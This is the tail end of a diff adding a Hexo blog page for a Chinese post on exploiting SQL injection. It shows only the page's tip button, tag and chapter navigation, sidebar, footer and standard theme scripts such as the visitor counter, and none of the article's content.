+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechatpay01.jpg" alt="发条橙子 WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全/" rel="tag">#安全</a>
+          
+            <a href="/tags/sql注入/" rel="tag">#sql注入</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/anquan_sqlinj22.html" rel="next" title="Sql注入攻击与防御总结：第2章 SQL注入测试">
+                <i class="fa fa-chevron-left"></i> Sql注入攻击与防御总结：第2章 SQL注入测试
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/anquan_sqlinj23.html" rel="prev" title="Sql注入攻击与防御总结：第3章 复查代码中的SQL注入">
+                Sql注入攻击与防御总结：第3章 复查代码中的SQL注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="anquan_sqlinj24.html"
+           data-title="Sql注入攻击与防御总结：第4章 利用SQL注入" data-url="http://www.fatiao.site/anquan_sqlinj24.html">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="发条橙子" />
+          <p class="site-author-name" itemprop="name">发条橙子</p>
+          <p class="site-description motion-element" itemprop="description">不积跬步，无以至千里</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">99</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <p class="post-toc-empty">此文章未包含目录</p>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2009 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">发条橙子</span>
+</div>
+
+<!--
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+-->
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.2.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.2.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"ftcz"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("E68bJY5qtsLfglErhVHLcN8w-gzGzoHsz", "Wjc3t8GBeMfc0xUJJi0JiWaW");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+</body>
+</html>
